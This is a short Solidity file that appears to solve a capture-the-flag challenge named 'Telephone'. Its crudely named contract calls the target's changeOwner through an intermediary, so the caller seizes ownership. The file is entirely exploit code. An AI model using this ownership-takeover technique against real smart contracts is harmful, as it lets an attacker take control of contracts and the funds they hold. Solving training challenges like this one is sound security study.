// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract TelephoneInterface {
    function changeOwner(address _owner) public {}
}

contract FuckTelephone {
    TelephoneInterface telephoneInterface;

    constructor(address _contractAddress) {
        telephoneInterface = TelephoneInterface(_contractAddress);
    }

    function fuck() external {
        telephoneInterface.changeOwner(msg.sender);
    }
}
